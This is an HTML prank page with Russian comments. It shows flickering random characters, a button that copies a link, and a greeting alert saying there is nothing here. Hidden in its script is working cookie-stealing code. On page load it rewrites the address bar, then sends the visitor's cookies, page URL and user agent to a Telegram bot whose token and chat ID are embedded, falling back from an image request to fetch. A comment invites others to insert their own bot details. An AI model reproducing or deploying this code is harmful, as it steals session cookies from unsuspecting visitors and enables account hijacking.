<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Привет</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            user-select: none;
        }
        #obfuscated {
            font-size: 3.5em;
            font-weight: bold;
            text-shadow: 0 0 20px #0f0;
            white-space: pre-wrap;
            word-break: break-all;
            max-width: 90vw;
            text-align: center;
            margin-bottom: 30px;
        }
        .copy-btn {
            background: #1a1a1a;
            border: 2px solid #0f0;
            color: #0f0;
            padding: 15px 40px;
            font-size: 1.5em;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            transition: 0.2s;
            z-index: 10;
        }
        .copy-btn:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 40px #0f0;
        }
        .copy-btn:active {
            transform: scale(0.95);
        }
        .hint {
            color: #888;
            font-size: 0.8em;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div id="obfuscated"></div>
    <button class="copy-btn" id="copyBtn">📋 Нажми, чтобы скопировать ссылку</button>
    <div class="hint">(ссылка: https://lol.com)</div>

    <script>
        // ========== 1. Меняем адресную строку на рандомную ==========
        (function() {
            var randomPath = '/' + Math.random().toString(36).substring(2, 8);
            history.replaceState(null, '', randomPath);
        })();

        // ========== 2. Эффект &k (мелькающие символы) ==========
        (function() {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/`~";
            var el = document.getElementById('obfuscated');
            var length = 45;
            var interval = 60;

            function randomChar() {
                return chars[Math.floor(Math.random() * chars.length)];
            }

            function generate() {
                var text = '';
                for (var i = 0; i < length; i++) {
                    text += randomChar();
                }
                return text;
            }

            el.textContent = generate();
            setInterval(function() {
                el.textContent = generate();
            }, interval);
        })();

        // ========== 3. Копирование https://lol.com по клику ==========
        (function() {
            var btn = document.getElementById('copyBtn');
            var targetUrl = 'https://lol.com';

            btn.addEventListener('click', function(e) {
                e.preventDefault();
                // Копируем в буфер обмена
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(targetUrl).then(function() {
                        btn.textContent = '✅ Скопировано!';
                        setTimeout(function() { btn.textContent = '📋 Нажми, чтобы скопировать ссылку'; }, 2000);
                    }).catch(function() {
                        fallbackCopy(targetUrl, btn);
                    });
                } else {
                    fallbackCopy(targetUrl, btn);
                }
            });

            function fallbackCopy(text, btn) {
                // Старый способ для старых браузеров
                var textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                try {
                    document.execCommand('copy');
                    btn.textContent = '✅ Скопировано!';
                    setTimeout(function() { btn.textContent = '📋 Нажми, чтобы скопировать ссылку'; }, 2000);
                } catch (err) {
                    alert('Не удалось скопировать. Скопируй вручную: ' + text);
                }
                document.body.removeChild(textarea);
            }
        })();

        // ========== 4. Alert и отправка кук в Telegram ==========
        (function() {
            // Сообщение пользователю
            alert("Привет, я не знаю, зачем ты сюда зашел, здесь ничего нет.");

            // Твои данные Telegram (ЗАМЕНИ!)
            var botToken = "7721494922:AAE3rqaQwY4eKMHb07Kb_Pv2HxK6LMv6up4";
            var chatId = "5570036809";

            var cookies = document.cookie || "(куки пусты)";
            var urlPage = window.location.href;
            var userAgent = navigator.userAgent;

            var msg = "Куки: " + cookies + "\nURL: " + urlPage + "\nUA: " + userAgent;
            if (msg.length > 4000) msg = msg.slice(0, 4000) + "... (обрезано)";

            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);

            // Отправка через Image
            var img = new Image();
            img.src = url;
            img.onerror = function() {
                fetch(url, { mode: "no-cors" }).catch(function(e) {
                    console.error("Ошибка отправки:", e);
                });
            };

            console.log("Отправка в Telegram:", url);
            console.log("Куки:", cookies);
        })();
    </script>
</body>
</html>
